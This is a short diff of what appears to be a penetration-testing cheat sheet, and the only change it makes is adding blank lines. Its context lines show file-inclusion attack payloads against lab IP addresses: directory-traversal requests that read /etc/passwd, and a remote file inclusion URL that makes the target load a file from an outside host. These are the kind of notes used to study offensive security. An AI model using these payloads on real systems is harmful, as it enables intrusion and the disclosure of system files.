@@ -690,11 +690,13 @@ http://10.11.1.71:80/cgi-bin/admin.cgi
 http://10.11.1.35/section.php?page=/etc/passwd
 ````
 <img src="https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png" width="480" height="250" />
+
 #### Enumeration
 ````
 anita@demon:/var/www/internal/backend/index.php #this file lives 5 directories deep.
 127.0.0.1:8000/backend/?view=../../../../../etc/passwd #So you have to add 5 ../ in order to read the files you want
 ````
+
 ### Remote File Inclusion
 ````
 http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
